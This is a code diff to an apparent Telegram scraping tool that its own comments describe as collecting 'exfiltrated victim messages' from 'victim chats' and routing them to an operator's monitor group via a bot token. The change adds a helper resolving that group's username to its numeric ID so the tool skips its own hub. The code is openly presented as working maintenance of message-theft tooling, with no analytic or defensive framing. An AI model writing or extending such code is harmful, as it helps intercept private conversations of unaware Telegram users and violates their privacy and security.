@@ -14,6 +14,39 @@ import httpx
 
 logger = logging.getLogger("scraper")
 
+# Resolve MONITOR_GROUP_ID to both its username and numeric forms so comparisons
+# work regardless of which format is stored (e.g. "@theprawnhunter" vs -1003588166404).
+# Populated lazily on first scrape so startup doesn't block on a network call.
+_MONITOR_GROUP_IDS: set[str] = set()
+
+def _get_monitor_group_ids() -> set[str]:
+    """Returns a set of string forms of the monitor group ID (username + numeric)."""
+    global _MONITOR_GROUP_IDS
+    if _MONITOR_GROUP_IDS:
+        return _MONITOR_GROUP_IDS
+    raw = str(settings.MONITOR_GROUP_ID).strip()
+    _MONITOR_GROUP_IDS.add(raw)
+    # If it's a username, resolve the numeric ID via Bot API
+    if raw.startswith("@") or not raw.lstrip("-").isdigit():
+        try:
+            import httpx as _httpx
+            from app.core.config import settings as _s
+            token = str(_s.MONITOR_BOT_TOKEN).split(",")[0].strip()
+            r = _httpx.get(
+                f"https://api.telegram.org/bot{token}/getChat",
+                params={"chat_id": raw}, timeout=10
+            )
+            numeric = r.json().get("result", {}).get("id")
+            if numeric:
+                _MONITOR_GROUP_IDS.add(str(numeric))
+        except Exception:
+            pass
+    return _MONITOR_GROUP_IDS
+
+def _is_monitor_group(chat_id) -> bool:
+    """True if chat_id (any form) refers to our monitor/hub group."""
+    return str(chat_id) in _get_monitor_group_ids()
+
 
 async def _resolve_history_result(result):
     while asyncio.isfuture(result) or asyncio.iscoroutine(result):
@@ -45,7 +78,7 @@ class ScraperService:
         Strategy 3: Bot API (getUpdates) - Fallback. Finds recent IDs (needed for Strat 2).
         """
         # Guard: never scrape the monitor group itself as a victim chat
-        if str(chat_id) == str(settings.MONITOR_GROUP_ID):
+        if _is_monitor_group(chat_id):
             logger.warning("⛔ [Scraper] Refusing to scrape monitor group as victim chat — skipping.")
             return []
 
@@ -672,7 +705,7 @@ class ScraperService:
                         # Skip any update that originated in our own monitor group —
                         # the kickstart flow sends commands there and we must not
                         # treat those as exfiltrated victim messages.
-                        if str(chat.get("id")) == str(settings.MONITOR_GROUP_ID):
+                        if _is_monitor_group(chat.get("id")):
                             continue
 
                         sender = target.get("from", {})
@@ -808,7 +841,7 @@ class ScraperService:
                                     chat = update[key].get("chat", {})
                                     chat_id = chat.get("id")
                                     # Never record our own monitor group as a victim chat
-                                    if str(chat_id) == str(settings.MONITOR_GROUP_ID):
+                                    if _is_monitor_group(chat_id):
                                         continue
                                     if chat_id and chat_id not in seen_chats:
                                         seen_chats.add(chat_id)
